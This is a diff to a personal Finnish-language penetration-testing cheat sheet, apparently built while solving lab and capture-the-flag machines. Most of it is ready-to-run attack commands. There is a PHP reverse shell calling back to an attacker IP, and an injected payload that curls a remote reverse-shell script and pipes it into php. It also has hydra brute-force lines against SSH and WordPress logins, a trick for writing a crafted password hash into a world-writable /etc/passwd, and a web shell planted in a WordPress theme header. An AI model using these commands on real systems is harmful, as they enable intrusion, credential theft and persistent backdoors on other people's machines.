@@ -124,10 +124,7 @@ etsi oikea offset:
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 33624132
 
 
-
-
 http://pentestmonkey.net/blog/post-exploitation-without-a-tty
-
 
 
 ShellShock: ( -X käytä proxyä)
@@ -166,6 +163,14 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/j.py
 python /tmp/j.py
 
+jos terminaalissa ei oikein vi toimi, koittaa background shell ja ajaa omalla koneella
+stty size
+49 198
+ja takas shell koneella asettaa ne samoiksi
+stty rows 48 cols 198
+
+oman linux salasanan luonti, voi laittaa /etc/passswd tiedostoon salasanan paikalle: yhdessä boksissa oli rw oikat kaikille tossa
+openssl passwd -l -salt jari salasana
 
 perl -e 'exec "/bin/bash";'
 
@@ -180,7 +185,10 @@ php -r '$sock=fsockopen("192.168.83.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 kun php:ssä eivät toimi system(), exec(), shell_exec() . tällä hakemistolistaus
 <?php $dir = '.'; $data=scandir($dir);print_r($data); ?>
 
-
+joa pääsee system komentoja php:llä, eli post requestissa pääsee antamaan system/...
+...xxx...&ipaddress=system('curl http://10.10.10.14/php-reverse-shell.php | php')
+pelkkä curl näyttäisi ruudulle tuon .php tiedoston sisällön, mutta kum pipi | php, php ajaa sen. pitää olla listener josta curl hakee ja toinen 
+missä nc on kuuntelemassa sessiota
 
 crack md5 pw's:
 https://crackstation.net/
@@ -231,6 +239,9 @@ hydra -l pipe -P /mnt/hgfs/temp/rockyou.txt 192.168.182.138 http-head /index.php
 
 hydra ssh password:
 hydra -L usernames.txt -e nsr 192.168.83.130 ssh
+
+helppo hydra www login: sitaatteihin kopioidaan burpista pyyntö, laitetaan vain ^USER^ ja pass paikoilleen ja katotaan failed attempt loppuun
+hydra -l falaraki -P list.txt 10.10.10.14 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^...:is incorrect"F
 
 hydraan voi myös laitaa optiot: -e ns -vV
 tällä näkee miten etenee
@@ -403,6 +414,9 @@ https://192.168.83.135:12380/blogblog/wp-content/uploads/
 kun on admintunnus/salasana hallussa metasploitilla voi ajaa exploitilla meterpreterin:
 use exploit/unix/webapp/wp_admin_shell_upload
 
+jos on admin tunnarit ja voi tallentaa themejä:
+Appearance/Editor ja tedostoon header.php, menee kaikkien sivujen kärkeen, sinne vain lisää vaiks <?php:n jälkeen
+echo system($REQUEST['cmd']);
 
 wordpress password brute force:
 wpscan --url http://192.168.83.131 --wordlist /root/vulnhub/mrRobot/fsocity.dic --username elliot
